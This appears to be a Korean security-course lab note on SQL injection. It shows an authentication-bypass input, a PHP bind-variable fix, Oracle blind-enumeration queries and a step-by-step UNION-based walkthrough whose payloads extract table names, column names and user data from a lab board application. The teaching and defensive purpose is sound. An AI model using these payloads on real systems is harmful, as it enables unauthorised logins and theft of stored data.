# SQL Injection 공격 및 대응방안

## 개요

- SQL Injection은 입력값을 통해 SQL 문을 조작하여 데이터베이스 정보를 탈취하는 공격입니다.
- 사용자 입력이 SQL 코드의 일부로 실행되는 취약점입니다.
- 입력값에 주석이나 조건을 삽입하면 원래 의도된 SQL 구조가 깨집니다.
- 특히 로그인 로직에서는 인증 조건을 무력화할 수 있습니다.

---

## SQL Injection 과정

### 공격 전

- 정상적으로 로그인 시에는 ID와 PW가 같아야 로그인이 됩니다.

```
ID : st04
PW : qw12
```

![17](/KH_Security/DataBase/img/17.png)

---

### 공격 후

```
ID : st04' --
PW : abc
```

![18](/KH_Security/DataBase/img/18.png)

- `--` 는 주석이므로 뒤의 SQL 문이 전부 무시가 되므로 비밀번호 검증이 사라집니다.
- 그래서 ID만 맞게 입력한다면은 로그인에 성공하게 됩니다.

---

### 대응방안

- 바인드 변수 사용
  - `바인드 변수란` : SQL 쿼리에서 사용자 입력값을 직접 문자열로 붙이지 않고, 별도의 변수로 전달하는 방식이며,  
  SQL 구조와 데이터를 분리하여 처리합니다.
```php
  $sql="select id, pw, name from id where id = :v_id and pw = RAWTOHEX(STANDARD_HASH(:v_pw, 'SHA256'))";
  
  $result=oci_parse($conn,$sql); // 파싱
  oci_bind_by_name($result, ":v_id", $id); // 바인드 변수 값 :v_id에 값을 제공합니다.
  oci_bind_by_name($result, ":v_pw", $pw); // 바인드 변수 값 :v_pw에 값을 제공합니다.
  $re=oci_execute($result); // SQL문을 실행합니다.
```

- 예를 들어 `st04' --` 와 같은 입력값이 전달되더라도, 해당 값은 SQL 문으로 해석되지 않고 하나의 문자열 데이터로 처리됩니다.
- 따라서 SQL 쿼리의 구조가 변경되지 않아 SQL Injection 공격을 방지할 수 있습니다.

---

### 대응방안 결과

![19](/KH_Security/DataBase/img/19.png)

- 인증 우회 실패로 로그인이 되지 않은 것을 확인할 수 있습니다.

---

## SQL Injection 실습 (UNION)

- UNION 기반 공격은 기존 쿼리 결과에 추가적으로 데이터를 출력시키는 방식입니다.

---

### Blind 공격

- 공격 대상에 대한 어떠한 정보도 없는 상태에서 시스템의 다양한 정보를 얻어내는 공격입니다.
- 테이블명, 컬럼명등의 정보를 얻어내는 공격 방법입니다.
- 사용되는 SQL 함수
  - SUBSTR(문자열, #, #)
  - LENGTH(문자열)

#### SQL문 예시

- n번째 테이블의 이름 길이
```sql
  select length
    ((select tname from (select rownum r, tname from tab order by tname)
    where r=n)) 
  from dual;
```

- n번째 테이블의 이름
```sql
  select tname
  from (select rownum r, tname from tab order by tname) 
  where r=n; 
```

-  n번째 테이블의 이름의 n번째 글자
```sql
  select substr
    ((select tname from (select rownum r, tname from sys.tab order by tname) 
    where r=n),n,1) 
  from dual;
```

- ID 테이블의 컬럼 갯수
```sql
  select substr ((select count(*) from cols where table_name = 'ID'),1,1) 
  from dual;
```

- ID 테이블의 n번째 컬럼의 이름
```sql
  select column_name
  from (select rownum r, column_name from cols 
        where table_name = 'ID' order by column_name)
  where r=n;
```

- ID 테이블의 n번째 컬럼의 n번째 글자
```sql
  select substr
    ((select column_name from (select rownum r, column_name from cols 
    where table_name = 'ID' order by column_name) 
    where r=n),n,1)
  from dual;
```

---

### 전체 공격 흐름

```
1. 컬럼 개수 파악
2. 데이터 타입 맞추기
3. 테이블 이름 추출
4. 컬럼 이름 추출
5. 실제 데이터 추출
```

---

### 취약한 SQL문

```sql
  sql = select bno, i.id, name, subject, to_char(bdate,'YYYY/MM/DD') bdate, hit  
  from board b, id i  
  where i.id=b.id and subject like '%입력값%'  
  order by bno desc;
```

- 입력한 값이 '%입력값%'에 그대로 들어가게 됩니다.

---

### 실습 과정

#### 컬럼 개수 확인

- **입력값**
```sql
  %' UNION select null, null, null, null, null, from dual --
```

![20](/KH_Security/DataBase/img/20.png)

- 컬럼 개수가 맞지 않아 오류가 뜹니다.

---

- **수정 된 입력값**
```sql
  %' UNION select null, null, null, null, null, null from dual --
```

![21](/KH_Security/DataBase/img/21.png)

- 정상 출력이 됐으므로 컬럼 개수는 6개인 것을 확인할 수 있습니다.

---

#### 컬럼 위치 확인

- **입력값**
```sql
  %' UNION select 10, 'A', 'B', 'C', 'D', 0 from dual --
```

![22](/KH_Security/DataBase/img/22.png)

- `10` : 번호
- `A` : 출력 X
- `B` : 글쓴이
- `C` : 제목
- `D` : 날짜
- `0` : 조회

---

#### 테이블명 확인

- **입력값**
```sql
  %' UNION select 10, 'A', tname, 'C', 'D', 0 from tab --
```

![23](/KH_Security/DataBase/img/23.png)

- `BOARD`, `CONTENT`, `DKDLEL`라는 테이블명이 나온 것을 알 수 있습니다.

---

#### 컬럼명 확인

- **입력값**
```sql
  %' UNION select 10, 'A', table_name, column_name, 'D', 0 from cols where table_name = 'DKDLEL' --
```

![24](/KH_Security/DataBase/img/24.png)

- `DKDLEL` 테이블의 컬럼명을 추출하여 구조를 파악합니다.
- 제목 : column_name
- 글쓴이 : table_name

---

#### 데이터 추출

- **입력값**
```sql
  %' UNION select 10, EMAIL, NAME, DKAGH, TJDAUD, 0 from DKDLEL --
```

![25](/KH_Security/DataBase/img/25.png)

---

#### 인증 우회를 통한 로그인 시도

```
ID : cderfv12' --
PW : qw12
```

![26](/KH_Security/DataBase/img/26.png)
